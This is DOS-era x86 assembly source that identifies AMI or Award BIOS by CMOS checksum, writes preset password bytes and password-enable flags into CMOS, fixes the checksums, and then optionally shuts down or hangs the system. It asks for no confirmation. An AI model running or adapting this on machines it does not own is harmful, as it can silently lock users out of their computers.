locals
.286
.model large, PASCAL

INCLUDE cmos.inc

EXTRN   Exit:PROC
EXTRN   KillOS:PROC
EXTRN   HangOS:PROC

GLOBAL  Main:PROC
GLOBAL  SetAWARD:PROC
GLOBAL  SetAMI:PROC

.data

INCLUDE data.mac

.code

Main    PROC PASCAL
; *** Following code attempts to identify Award BIOS by checksum...
; Appears to _NOT_ work on oldest Awards... Dammit!!!
;        push    48h
;        push    79h
;        call    CalculateChecksum
;        mov     bx, ax
;
;        push    7Ah
;        call    ReadCMOSW
;
;        cmp     ax, bx
;        jne     Try_AMI
;
;        call    SetAWARD
;        jmp     short Bye
;
;Try_AMI:

; *** Current algorythm is (in pseudo C-code):
;
; if (BIOS_Is_AMI())
; {
;    SetAMI();
; }
; else
; {
;    SetAWARD();
; }
; Do_Selected_Exit();
;
; *** Stupid, isn't?! Well... Fix it!!!

        push    37h                     ; Get AMI extended checksums
        push    3Dh                     ; (NOTE: this code CAN be optimized!!!)
        call    CalculateChecksum       ; (OTHER NOTE: It MUST be optimized!!!)
        mov     bx, ax                  ; (TIP: calculate checksum from 37h to
                                        ;  7Ch, and subtract values from 3Eh and 3Fh)
        push    40h
        push    7Ch
        call    CalculateChecksum
        add     bx, ax

        push    3Eh                     ; Now, read stored checksum
        call    ReadCMOSW

        cmp     ax, bx                  ; Are both checksums same?
        jne     Try_AWARD

        call    SetAMI                  ; If so, we have compatible AMI BIOS
                                        ; right here!!!

Try_AWARD:
        call    SetAWARD                ; Well... Doesn't need comments...
                                        ; Just see pseudo-code above...

Bye:
        cmp     [ExitMode], 1           ; Mode 1: Shutdown
        jnz     Not_Kill
        call    KillOS
Not_Kill:
        cmp     [ExitMode], 2           ; Mode 2: SHITdown ;)
        jnz     Not_Hang
        call    HangOS
Not_Hang:
        call    Exit                    ; Mode 0: Just die...
ENDP Main


;*************************************
; Password storage routines
;*************************************
SetAWARD PROC PASCAL
        USES    ax

	push	11h
	call	ReadCMOS

	or      al, 3

	push	11h
	push	ax
	call	WriteCMOS

        push    1Ch
        push    [WORD PTR AWARD+0]
        call    WriteCMOS

        push    1Dh
        push    [WORD PTR AWARD+1]
        call    WriteCMOS

        push    10h
        push    2Dh
        call    CalculateChecksum

        push    2Eh
        push    ax
        call    WriteCMOSW

        ret
ENDP SetAWARD


SetAMI PROC PASCAL
        USES    ax, bx, si, di

        push    29h
	call	ReadCMOS

        or      al, 10h

        push    29h
	push	ax
	call	WriteCMOS

        push    10h
        push    2Dh
        call    CalculateChecksum

        push    2Eh
        push    ax
        call    WriteCMOSW

        mov     di, 37h
        mov     si, offset AMI

Send:
        push    di
        push    [si]
        call    WriteCMOS

        inc     si
        inc     di

        cmp     di, 3Dh
        jle     short Send

        push    37h
        push    3Dh
        call    CalculateChecksum
        mov     bx, ax

        push    40h
        push    7Ch
        call    CalculateChecksum
        add     ax, bx

        push    3Eh
        push    ax
        call    WriteCMOSW

        ret
ENDP SetAMI

END
